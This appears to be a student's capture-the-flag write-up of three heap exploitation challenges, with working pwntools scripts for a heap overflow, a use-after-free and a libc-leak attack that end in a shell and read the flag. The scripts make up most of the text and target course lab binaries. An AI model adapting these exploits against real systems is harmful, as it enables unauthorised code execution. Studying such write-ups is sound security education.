heap-1
===========================

General overview of problems faced
-------------------------------------
had to find where heap overflow was happening and then find how to exploit it

List of vulnerabilities
--------------------
1. heap overflow
2. unobfusticated system call
Steps to exploit
------------------
1. objdump to find memory address of main, and system call
2. determine code flow by using ida
3. find vulnerable part of code and determine overflow behaviour
4. craft payload in pwn template
5. inject payload and get shell

Script/Command used
------------------
```'''
pwn template
io = start()
print io.recvuntil("5. exit")
io.sendline("1")
print io.recvuntil("10)")
io.sendline("0")
print io.recvline()
io.sendline("1")
print io.recvline()
io.sendline("1")
print io.recvline()
payload = "\x90"*102 + p32(0x0804868f)
io.sendline(payload)
print io.recvuntil("5. exit")
io.sendline("3")
print io.recvuntil("10)")
io.sendline("0")
io.sendline("ls")
io.sendline("cat flag")
io.interactive()
```


`6447{09d435a4-a0dd-46a9-bd7f-f39fdbf10cd3}`

heap-2
===========================

General overview of problems faced
-------------------------------------
since the delete was behaving differerntly from heap 1 it appeared to be a use-after-free
problem but the program was running signifcantly different in gdb and LOCAL.

List of vulnerabilities
--------------------
1. use-after-free
2. unobfusticated system call

Steps to exploit
------------------
1. objdump to find memory address of main, and system call
2. determine code flow by using ida
3. find vulnerable part of code and determine overflow behaviour using pwn tools gdb attach
4. craft payload in pwn template
5. inject payload and get shell

Script/Command used
------------------
```'''
pwn template
io = start()
#core = io.corefile
print io.recvuntil("exit")
io.sendline("1")    #add fish
print io.recvline()
io.sendline("0")    #create fish 0
print io.recvline()
io.sendline("0")
print io.recvline()
io.sendline("0")
print io.recvline()
payload1 = "b"*50
io.sendline(payload1) #garbage name
print io.recvuntil("exit")
io.sendline("4")    #select to delete fish 0
print io.recvline()
io.sendline("0")    #delete fish 0
print io.recvuntil("exit")
io.sendline("1") #select menu option
print io.recvline()
print io.recvline()
io.sendline("1") #add fish 1
print io.recvline()
io.sendline("1") #add size
print io.recvline()
io.sendline("1") #add weight
print io.recvline()
payload2 = "a"*38+p32(0x080486c0)+"b"*8
#payload2 = "a"*50
io.sendline(payload2)
print io.recvuntil("exit")
io.sendline("3")
print io.recvline()
io.sendline("0")
print io.recvline()
io.sendline('ls')
sleep(1)
io.sendline('cat flag')
io.interactive()
```

`6447{b20e6d03-f58c-43b7-974a-f801bb9a2fb5}`

heap-3
===========================

General overview of problems faced
-------------------------------------
the heap kept shifting

List of vulnerabilities
--------------------
1. use-after-free
2. memory leak
3. access to libc static object

Steps to exploit
------------------
1. objdump to find memory address of main, and system call
2. determine code flow by using ida
3. find vulnerable part of code and determine overflow behaviour using pwn tools gdb attach
4. craft payload in pwn template using memory leak from binary and offset from libc file
5. inject payload and get shell

Script/Command used
------------------
```'''
pwn template
io = start()
print io.recvuntil("exit")
io.sendline("1")    #add fish
print io.recvline()
io.sendline("0")    #create fish 0
print io.recvline()
io.sendline("2147483647")
print io.recvline()
io.sendline("2147483647")
print io.recvline()
payload1 = "a"*16
io.send(payload1) #garbage name

print io.recvuntil("exit")
io.sendline("4")    #select to delete fish 0
print io.recvline()
io.sendline("0")    #delete fish 0
print io.recvuntil("exit")
io.sendline("1") #select menu option
print io.recvline()
print io.recvline()
io.sendline("1") #add fish 1
print io.recvline()
io.sendline("2147483647") #add size
print io.recvline()
io.sendline("2147483647") #add weight
print io.recvline()
#payload2 = "aa"+p32(0xf7e7d0d0)*8+p32(0x080486c0)+"12345678"
#payload2 = "a"*38+p32(0x080486c0)+"b"*8
payload2 = ""

#payload2 = "aaaabbbb"+p32(0xf7dfd200)+p32(0xffffdc8a)
io.sendline(payload2)
print io.recvuntil("exit")
io.sendline("3")
print io.recvline()
io.sendline("1")
io.recvline()
io.recvline()
#d1 04 08 ff ff ff 7f 70 65 e2 f7 70 d1 04 08 20
raw_output = io.recvline()
#print raw_output
address = ''.join(x.encode('hex') for x in raw_output[7:11][::-1])
#print address
address = int(address,16)
print address
fputs = 0x05ed60
bin_sh = 0x15f60f
system = 0x03b020
print fputs
print bin_sh
print system
#difference = fputs - system;
#print "diff: ",difference
print io.recvuntil("exit")
io.sendline("4")    #select to delete fish 0
print io.recvline()
io.sendline("1")    #delete fish 1
print io.recvuntil("exit")
io.sendline("1") #select menu option
print io.recvline()
print io.recvline()
io.sendline("2") #add fish 2
print io.recvline()
io.sendline("2147483647") #add size
print io.recvline()
io.sendline("2147483647") #add weight
print io.recvline()
payload3 = 'a'*8+p32(address - fputs + system) + p32(address - fputs + bin_sh)
io.sendline(payload3)

```

`6447{401cb70c-1032-4ffe-8230-f0bbf81e8370}`

